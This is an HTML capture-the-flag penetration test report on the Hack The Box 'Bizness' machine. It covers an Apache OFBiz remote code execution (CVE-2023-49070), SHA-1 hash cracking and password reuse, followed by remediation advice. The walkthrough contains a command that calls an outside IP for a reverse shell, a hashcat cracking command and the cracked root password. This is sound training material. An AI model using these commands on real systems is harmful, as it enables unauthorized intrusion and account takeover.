@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Report - Bizness</title>
+    <style>
+        /* --- Screen Styles --- */
+        body {
+            background-color: #0a4b63; /* Dark Teal Background */
+            color: #f0f0f0; /* Off-white text for readability */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px 40px; /* Added more horizontal padding */
+            background-color: #0c5975; /* Slightly lighter container background */
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        }
+        h1, h2, h3, h4 {
+            color: #ffffff;
+            border-bottom: 1px solid #2a9d8f;
+            padding-bottom: 10px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            padding: 20px 0;
+            border-top: 3px solid #93c47d; /* Green accent line */
+            border-bottom: 3px solid #93c47d; /* Green accent line */
+            margin-bottom: 5px;
+        }
+        h2.subtitle {
+             text-align: center;
+             font-size: 1.8em;
+             border: none;
+             margin-top: 0;
+             margin-bottom: 5px;
+        }
+        h3.report-meta {
+            text-align: center;
+            font-size: 1.2em;
+            border: none;
+            margin-top: 0;
+            margin-bottom: 20px;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background-color: #2a9d8f;
+            margin: 30px 0;
+        }
+        .confidential {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .confidential strong {
+            font-size: 1.1em;
+        }
+        .confidential em {
+            font-size: 0.9em;
+            color: #cccccc;
+        }
+        a {
+            color: #93c47d; /* Green accent for links */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        ul, ol {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #1a7469;
+        }
+        thead {
+            background-color: #93c47d; /* Green accent for table headers */
+            color: #0a4b63;
+        }
+        thead th {
+             font-weight: bold;
+        }
+        tbody tr:nth-child(even) {
+            background-color: #0a4b63; /* Striped rows */
+        }
+        pre {
+            background-color: #002b36; /* Darker background for code */
+            color: #cddc39; /* Lime green text for code */
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border: 1px solid #1a7469;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .footer {
+             text-align: center;
+             margin-top: 40px;
+             font-style: italic;
+             color: #cccccc;
+        }
+
+        /* --- PRINT STYLES --- */
+        /* These rules only apply when the page is printed */
+        @media print {
+            body {
+                background-color: #ffffff;
+                color: #000000;
+                font-family: Georgia, "Times New Roman", Times, serif; /* Serif fonts are easier to read on paper */
+                font-size: 12pt;
+                margin: 1in; /* Standard print margin */
+            }
+
+            .container {
+                box-shadow: none;
+                border: none;
+                width: 100%;
+                max-width: 100%;
+                padding: 0;
+                margin: 0;
+            }
+
+            h1, h2, h3, h4 {
+                color: #000000;
+                border-bottom: 2px solid #000000;
+                /* Avoid page breaks right after a heading */
+                page-break-after: avoid;
+            }
+
+            h1 {
+                font-size: 24pt;
+                border-top: 3px solid #000000;
+                border-bottom: 3px solid #000000;
+            }
+            
+            h2 { font-size: 18pt; }
+            h3 { font-size: 14pt; }
+
+            hr {
+                border: 0;
+                height: 1px;
+                background-color: #000000;
+            }
+
+            a {
+                color: #000000;
+                text-decoration: underline;
+            }
+            
+            /* Show the full URL after external links for reference on paper */
+            a[href^="http"]:after {
+                content: " (" attr(href) ")";
+                font-size: 9pt;
+                font-weight: normal;
+            }
+            
+            /* Do not show URL for internal anchor links */
+            a[href^="#"]:after {
+                content: "";
+            }
+
+            table {
+                /* Try to keep tables from splitting across pages */
+                page-break-inside: avoid;
+            }
+
+            thead {
+                background-color: #dddddd; /* Light grey header for B&W printing */
+                color: #000000;
+                /* Ensure table header repeats on each page if table splits */
+                display: table-header-group; 
+            }
+
+            th, td {
+                border: 1px solid #666666;
+            }
+
+            tbody tr:nth-child(even) {
+                background-color: #f2f2f2; /* Lighter stripe for printing */
+            }
+
+            pre {
+                background: #f4f4f4;
+                color: #000;
+                border: 1px solid #ccc;
+                /* Try to keep code blocks from splitting across pages */
+                page-break-inside: avoid;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <h1>CAPTURE THE FLAG PENETRATION TESTING</h1>
+        <h2 class="subtitle">Report of Findings</h2>
+        <h3 class="report-meta">Bizness</h3>
+        <h3 class="report-meta">21st of April 2025</h3>
+        <h3 class="report-meta">Version 1.0</h3>
+
+        <div class="confidential">
+            <strong>Confidential</strong><br>
+            <em>For educational and training purposes only</em>
+        </div>
+
+        <hr>
+
+        <h2 id="table-of-contents">Table of Contents</h2>
+        <ol>
+            <li><a href="#statement-of-confidentiality">Statement of Confidentiality</a></li>
+            <li><a href="#engagement-contacts">Engagement Contacts</a></li>
+            <li><a href="#executive-summary">Executive Summary</a></li>
+            <li><a href="#network-penetration-test-assessment-summary">Network Penetration Test Assessment Summary</a></li>
+            <li><a href="#internal-network-compromise-walkthrough">Internal Network Compromise Walkthrough</a></li>
+            <li><a href="#remediation-summary">Remediation Summary</a></li>
+            <li><a href="#technical-finding-details">Technical Finding Details</a></li>
+            <li><a href="#appendices">Appendices</a></li>
+        </ol>
+
+        <hr>
+
+        <h2 id="statement-of-confidentiality">Statement of Confidentiality</h2>
+        <p>The contents of this document have been developed during a capture the flag exercise. The contents of the document may be shared or used for educational and training purposes only. Exercising any of the techniques of this document without prior written consent by the owner of the internet assets may be considered as an offence and may bear legal responsibility.</p>
+        <p>The contents of this document do not constitute legal advice. Litigation or other legal interests are not intended as legal counsel and should not be taken as such. The assessment detailed herein is against a fictional company for training and examination purposes, and the vulnerabilities in no way affect real company's external or internal infrastructure.</p>
+
+        <hr>
+
+        <h2 id="engagement-contacts">Engagement Contacts</h2>
+        <h3>Customer Contacts</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Primary contact</th>
+                    <th>Title</th>
+                    <th>Primary contact email</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Example name</td>
+                    <td>Example title</td>
+                    <td>example@bar.com</td>
+                </tr>
+            </tbody>
+        </table>
+        <table>
+            <thead>
+                <tr>
+                    <th>Secondary contact</th>
+                    <th>Title</th>
+                    <th>Secondary contact email</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Example name</td>
+                    <td>Example title</td>
+                    <td>example@bar.com</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Assessor Contacts</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Assessor name</th>
+                    <th>Title</th>
+                    <th>Assessor email</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>SvetozarP</td>
+                    <td>Example title</td>
+                    <td>example@bar.com</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <hr>
+
+        <h2 id="executive-summary">Executive Summary</h2>
+        <p>The below described penetration test has been conducted as part of a "capture the flag" training exercise, assessing the security of internet asset, provided by Hack The Box and documenting the findings in clear and repeatable manner. This document aims to also provide remediation recommendations.</p>
+
+        <h3>Approach</h3>
+        <p>The below described exercise was performed on 21st of April 2025 under a "black box" approach without any credentials or any advance knowledge of the target's structure or environment, besides that the system is running a Linux operational system. Testing was performed with the aim of securing a shell to the system and capturing the user and the root user's flags. The testing was performed remotely. Weaknesses leading to exploitation and capturing the flag are documented and manually investigated to show exploitation potential.</p>
+
+        <h3>Scope</h3>
+        <p>The scope of this assessment is the Bizness machine, provisioned by Hack The Box.</p>
+        <table>
+            <thead>
+                <tr>
+                    <th>Host / URL / IP Address</th>
+                    <th>Description</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>bizness.htb / 10.10.11.252</td>
+                    <td>Hack The Box testing machine</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Assessment overview and recommendations</h3>
+        <p>During the capture the flag exercise, the tester found five (5) security findings, which threaten the confidentiality, integrity and security of the tested machine. These findings were categorised by severity level as two (2) critical severity, one (1) high severity, one (1) medium severity and one (1) low severity.</p>
+        <p>The first critical severity finding comprised of a Remote Code Execution vulnerability in Apache OFBiz, which allowed the tester to execute code on the machine remotely.</p>
+        <p>The second critical severity finding comprised of weak password hashing implementation, which allowed the tester to crack administrative credentials.</p>
+        <p>The high severity finding comprised of Password re-use, allowing the tester to obtain administrative access through re-used passwords.</p>
+        <p>The medium severity finding comprised of the use of weak cryptographic hashing algorithms that are vulnerable to brute force attacks.</p>
+        <p>The low severity finding comprised of deprecated TLS versions (TLS 1.0 and 1.1) being enabled on the web server.</p>
+
+        <hr>
+        
+        <h2 id="network-penetration-test-assessment-summary">Network Penetration Test Assessment Summary</h2>
+        <p>The testing activity commenced without prior knowledge of the software, running on the machine, apart of the type of the operational system, which was provided as Linux. The tester acted from the perspective of unauthorized user.</p>
+        <h3>Summary of findings</h3>
+        <p>During the course of testing, the tester uncovered a total of five (5) findings, which pose risk to the host's information systems. Findings are described in the tables below:</p>
+        <h4>Findings severity</h4>
+        <table>
+            <thead>
+                <tr>
+                    <th>Critical</th>
+                    <th>High</th>
+                    <th>Medium</th>
+                    <th>Low</th>
+                    <th>Total</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>2</td>
+                    <td>1</td>
+                    <td>1</td>
+                    <td>1</td>
+                    <td>5</td>
+                </tr>
+            </tbody>
+        </table>
+        <h4>Findings list</h4>
+        <table>
+            <thead>
+                <tr>
+                    <th>Finding #</th>
+                    <th>Severity Level</th>
+                    <th>Finding name</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>1</td>
+                    <td>Critical</td>
+                    <td>CVE-2023-49070 - Apache OFBiz Remote Code Execution allowed the tester to execute code on the machine remotely.</td>
+                </tr>
+                <tr>
+                    <td>2</td>
+                    <td>Critical</td>
+                    <td>Weak password hashing implementation allowed the tester to crack administrative credentials.</td>
+                </tr>
+                <tr>
+                    <td>3</td>
+                    <td>High</td>
+                    <td>Re-used passwords allowed the tester to obtain administrative access.</td>
+                </tr>
+                <tr>
+                    <td>4</td>
+                    <td>Medium</td>
+                    <td>Weak cryptographic hashing algorithms vulnerable to brute force attacks.</td>
+                </tr>
+                <tr>
+                    <td>5</td>
+                    <td>Low</td>
+                    <td>Deprecated TLS versions (TLS 1.0 and 1.1) enabled on web server.</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <hr>
+
+        <h2 id="internal-network-compromise-walkthrough">Internal Network Compromise Walkthrough</h2>
+        <p>During the course of the exercise, the tester was able to gain foothold through Remote Code Execution vulnerability in Apache OFBiz, which led to reverse shell access to the tested machine. Further enumeration enabled the tester to obtain password hash for administrative user and crack it using brute force attacks. Password re-use allowed the tester to obtain full administrative access to the machine.</p>
+        <p>The steps below illustrate the path from initial foothold to full control and do not include all of the vulnerabilities and misconfigurations discovered during the course of testing. Issues discovered, and not part of the path to compromise are listed in the Technical Findings Details section of this report, ranked by severity level.</p>
+        <h3>Detailed Walkthrough</h3>
+        <p>The tester performed the following to fully compromise the Bizness machine:</p>
+        <ol>
+            <li>Using CVE-2023-49070 vulnerability in Apache OFBiz, the tester was able to obtain reverse shell from the machine</li>
+            <li>Enumeration allowed the tester to discover Apache OFBiz Derby database containing password hashes</li>
+            <li>Analysis of the password hashing implementation revealed weak SHA-1 hashing with short salt</li>
+            <li>The tester was able to crack the administrative password using hashcat</li>
+            <li>Password re-use allowed the tester to obtain root access to the machine</li>
+        </ol>
+        <h4>Detailed reproduction of the steps above:</h4>
+        <p>The website running on the machine was found to be running Apache OFBiz Release 18.12, which is vulnerable to CVE-2023-49070.</p>
+        <p><strong>Initial reconnaissance revealed:</strong></p>
+        <ul>
+            <li>Port 22: SSH OpenSSH_8.4p1 Debian-5+deb11u3</li>
+            <li>Port 80: HTTP (redirects to HTTPS)</li>
+            <li>Port 443: HTTPS nginx/1.18.0</li>
+            <li>Port 45157: Unknown service</li>
+        </ul>
+        <p>The tester identified the target was running Apache OFBiz by accessing the login portal at <code>https://bizness.htb/catalog/control/main</code>.</p>
+        <p><strong>Exploitation:</strong><br>Using the CVE-2023-49070 exploit, the tester executed a payload that established a reverse shell connection:</p>
+        <pre><code>python ofbiz_exploit.py https://bizness.htb shell 10.10.14.11:4444</code></pre>
+        <p>The exploit was successful and provided shell access as the <code>ofbiz</code> user.</p>
+        <p><strong>Enumeration and Privilege Escalation:</strong><br>Once inside the system, the tester discovered the Apache OFBiz Derby database located at <code>/opt/ofbiz/runtime/data/derby/</code>. The database was transferred to the attacker machine for analysis.</p>
+        <p>Database analysis revealed the administrative user credentials:</p>
+        <ul>
+            <li>Username: admin</li>
+            <li>Password Hash: <code>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I</code></li>
+        </ul>
+        <p><strong>Hash Analysis:</strong><br>The tester analyzed the OFBiz password hashing implementation in <code>HashCrypt.java</code> and discovered:</p>
+        <ul>
+            <li>Algorithm: SHA-1</li>
+            <li>Salt: <code>d</code> (single character)</li>
+            <li>Format: Base64URL-safe encoding</li>
+        </ul>
+        <p><strong>Password Cracking:</strong><br>The hash was converted to standard format and cracked using hashcat:</p>
+        <pre><code>hashcat -m 120 -a 0 hash /usr/share/wordlists/rockyou.txt</code></pre>
+        <p>Result: <code>monkeybizness</code></p>
+        <p><strong>Root Access:</strong><br>The cracked password was reused for the root account, allowing full system compromise:</p>
+        <pre><code>su root
+Password: monkeybizness</code></pre>
+        <p>The tester successfully obtained root access and retrieved both user and root flags.</p>
+
+        <hr>
+
+        <h2 id="remediation-summary">Remediation Summary</h2>
+        <p>The assessment has uncovered several opportunities for strengthening the security of the machine. Remediation efforts are prioritized below, starting from those, likely to take least amount of time and effort to complete.</p>
+        <h3>Short term</h3>
+        <ul>
+            <li>Update Apache OFBiz to the latest version to patch CVE-2023-49070</li>
+            <li>Implement strong password policies preventing password reuse</li>
+            <li>Replace weak SHA-1 hashing with modern algorithms (bcrypt, scrypt, or Argon2)</li>
+            <li>Increase salt complexity and uniqueness</li>
+            <li>Disable deprecated TLS versions (1.0 and 1.1)</li>
+        </ul>
+        <h3>Medium term</h3>
+        <ul>
+            <li>Implement multi-factor authentication for administrative accounts</li>
+            <li>Regular security updates and vulnerability assessments</li>
+            <li>Network segmentation and access controls</li>
+        </ul>
+        <h3>Long term</h3>
+        <ul>
+            <li>Perform ongoing vulnerability assessments and password audits</li>
+            <li>Educate users to develop strong password habits</li>
+            <li>Implement comprehensive security monitoring and logging</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="technical-finding-details">Technical Finding Details</h2>
+        <h3>1. Apache OFBiz Remote Code Execution (CVE-2023-49070) - Critical</h3>
+        <table>
+            <tbody>
+                <tr><td><strong>CWE</strong></td><td>CVE-2023-49070</td></tr>
+                <tr><td><strong>CVSS 3.1 Score</strong></td><td>9.8</td></tr>
+                <tr><td><strong>Description</strong></td><td>The tester was able to execute code on the tested machine remotely without authorization using a known vulnerability in Apache OFBiz Release 18.12.</td></tr>
+                <tr><td><strong>Security Impact</strong></td><td>An unauthorised actor can execute arbitrary code on the server, leading to full system compromise.</td></tr>
+                <tr><td><strong>Affected domain</strong></td><td>bizness.htb</td></tr>
+                <tr><td><strong>Remediation</strong></td><td>- Update Apache OFBiz to the latest patched version<br>- Implement network segmentation<br>- Apply security patches promptly</td></tr>
+                <tr><td><strong>External References</strong></td><td>- <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49070">https://nvd.nist.gov/vuln/detail/CVE-2023-49070</a></td></tr>
+            </tbody>
+        </table>
+        <p><strong>Finding evidence:</strong><br>The tester successfully exploited CVE-2023-49070 to gain remote code execution and establish a reverse shell connection to the target machine.</p>
+
+        <h3>2. Weak Password Hashing Implementation - Critical</h3>
+        <table>
+            <tbody>
+                <tr><td><strong>CWE</strong></td><td>CWE-327</td></tr>
+                <tr><td><strong>CVSS 3.1 Score</strong></td><td>9.1</td></tr>
+                <tr><td><strong>Description</strong></td><td>The system uses weak SHA-1 hashing with minimal salt, making password hashes vulnerable to brute force attacks.</td></tr>
+                <tr><td><strong>Security Impact</strong></td><td>Attackers can easily crack password hashes, leading to credential compromise and unauthorized access.</td></tr>
+                <tr><td><strong>Affected domain</strong></td><td>bizness.htb</td></tr>
+                <tr><td><strong>Remediation</strong></td><td>- Implement strong password hashing algorithms (bcrypt, scrypt, Argon2)<br>- Use cryptographically secure random salts<br>- Increase computational cost of hashing</td></tr>
+                <tr><td><strong>External References</strong></td><td>- <a href="https://cwe.mitre.org/data/definitions/327.html">https://cwe.mitre.org/data/definitions/327.html</a></td></tr>
+            </tbody>
+        </table>
+        <p><strong>Finding evidence:</strong><br>The administrative password hash <code>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I</code> was easily cracked using hashcat, revealing the password "monkeybizness".</p>
+
+        <h3>3. Password Re-use - High</h3>
+        <table>
+            <tbody>
+                <tr><td><strong>CWE</strong></td><td>CWE-521</td></tr>
+                <tr><td><strong>CVSS 3.1 Score</strong></td><td>8.8</td></tr>
+                <tr><td><strong>Description</strong></td><td>The same password was reused across multiple accounts (admin application user and system root user).</td></tr>
+                <tr><td><strong>Security Impact</strong></td><td>If one account is compromised, attackers can access other accounts with the same credentials, leading to broader system breaches.</td></tr>
+                <tr><td><strong>Affected domain</strong></td><td>bizness.htb</td></tr>
+                <tr><td><strong>Remediation</strong></td><td>- Implement unique, strong passwords for each account<br>- Employ password managers and enforce password policies<br>- Implement multi-factor authentication</td></tr>
+                <tr><td><strong>External References</strong></td><td>- <a href="https://cwe.mitre.org/data/definitions/521.html">https://cwe.mitre.org/data/definitions/521.html</a></td></tr>
+            </tbody>
+        </table>
+        <p><strong>Finding evidence:</strong><br>The cracked administrative password "monkeybizness" was successfully reused to gain root access to the system.</p>
+
+        <h3>4. Weak Cryptographic Hashing Algorithms - Medium</h3>
+        <table>
+            <tbody>
+                <tr><td><strong>CWE</strong></td><td>CWE-328</td></tr>
+                <tr><td><strong>CVSS 3.1 Score</strong></td><td>5.5</td></tr>
+                <tr><td><strong>Description</strong></td><td>The system uses SHA-1 hashing algorithm which is considered cryptographically weak and vulnerable to collision attacks.</td></tr>
+                <tr><td><strong>Security Impact</strong></td><td>Weak hashing algorithms can be exploited to compromise data integrity and authentication mechanisms.</td></tr>
+                <tr><td><strong>Affected domain</strong></td><td>bizness.htb</td></tr>
+                <tr><td><strong>Remediation</strong></td><td>- Migrate to stronger hashing algorithms (SHA-256 minimum)<br>- Implement proper password hashing with salt and iterations</td></tr>
+                <tr><td><strong>External References</strong></td><td>- <a href="https://cwe.mitre.org/data/definitions/328.html">https://cwe.mitre.org/data/definitions/328.html</a></td></tr>
+            </tbody>
+        </table>
+        <p><strong>Finding evidence:</strong><br>Analysis of the password hashing implementation revealed the use of deprecated SHA-1 algorithm with minimal salt complexity.</p>
+
+        <h3>5. Deprecated TLS Versions Enabled - Low</h3>
+        <table>
+            <tbody>
+                <tr><td><strong>CWE</strong></td><td>CWE-326</td></tr>
+                <tr><td><strong>CVSS 3.1 Score</strong></td><td>3.7</td></tr>
+                <tr><td><strong>Description</strong></td><td>The web server supports deprecated TLS versions 1.0 and 1.1 which have known security vulnerabilities.</td></tr>
+                <tr><td><strong>Security Impact</strong></td><td>Use of deprecated TLS versions may allow attackers to exploit known protocol weaknesses.</td></tr>
+                <tr><td><strong>Affected domain</strong></td><td>bizness.htb</td></tr>
+                <tr><td><strong>Remediation</strong></td><td>- Disable TLS 1.0 and 1.1<br>- Configure server to use TLS 1.2 and 1.3 only<br>- Implement strong cipher suites</td></tr>
+                <tr><td><strong>External References</strong></td><td>- <a href="https://cwe.mitre.org/data/definitions/326.html">https://cwe.mitre.org/data/definitions/326.html</a></td></tr>
+            </tbody>
+        </table>
+        <p><strong>Finding evidence:</strong><br>SSL scan revealed that the server accepts connections using deprecated TLS 1.0 and TLS 1.1 protocols.</p>
+
+        <hr>
+
+        <h2 id="appendices">Appendices</h2>
+        <h3>Appendix A – Finding Severities</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Rating</th>
+                    <th>Definition</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Critical</strong></td>
+                    <td>Represents the most serious vulnerabilities, often with a CVSS score of 9.0 or higher. These vulnerabilities can lead to significant data breaches, system compromise, or complete loss of functionality.</td>
+                </tr>
+                <tr>
+                    <td><strong>High</strong></td>
+                    <td>High severity vulnerabilities, with CVSS scores typically ranging from 7.0 to 8.9, can also pose a significant risk to confidentiality, integrity, or availability. Exploitation could lead to substantial damage.</td>
+                </tr>
+                <tr>
+                    <td><strong>Medium</strong></td>
+                    <td>Medium severity vulnerabilities (CVSS scores 4.0 to 6.9) are less likely to result in severe consequences but can still be exploited to access sensitive data or disrupt operations.</td>
+                </tr>
+                <tr>
+                    <td><strong>Low</strong></td>
+                    <td>Low severity vulnerabilities (CVSS scores 1.0 to 3.9) pose minimal risk, often requiring specific conditions or privileges to exploit. They might not directly lead to significant damage but could be a building block for more severe attacks.</td>
+                </tr>
+                <tr>
+                    <td><strong>Informational/None</strong></td>
+                    <td>These levels are often used for findings that do not represent a security vulnerability but are still important for security awareness or potential future vulnerabilities.</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Appendix B – Exploited hosts</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Host</th>
+                    <th>Scope</th>
+                    <th>Method</th>
+                    <th>Notes</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>bizness.htb</td>
+                    <td>Remote</td>
+                    <td>CVE-2023-49070 RCE</td>
+                    <td>Domain compromise</td>
+                </tr>
+                <tr>
+                    <td>bizness.htb</td>
+                    <td>Internal</td>
+                    <td>Password cracking</td>
+                    <td>Privilege Escalation</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Appendix C – Compromised users</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Username</th>
+                    <th>Type</th>
+                    <th>Method</th>
+                    <th>Notes</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>ofbiz</td>
+                    <td>Service user</td>
+                    <td>Remote Code Execution</td>
+                    <td>Initial access user</td>
+                </tr>
+                <tr>
+                    <td>admin</td>
+                    <td>Administrative user</td>
+                    <td>Password cracking</td>
+                    <td>OFBiz administrator</td>
+                </tr>
+                <tr>
+                    <td>root</td>
+                    <td>Administrator</td>
+                    <td>Password re-use</td>
+                    <td>System administrator</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Appendix D – Cleanup</h3>
+        <p>Cleanup is not required after this operation.</p>
+        
+        <hr>
+
+        <div class="footer">
+            <p><strong>End of Report</strong></p>
+            <p>Confidential - For educational and training purposes only</p>
+        </div>
+
+    </div>
+
+</body>
+</html>```
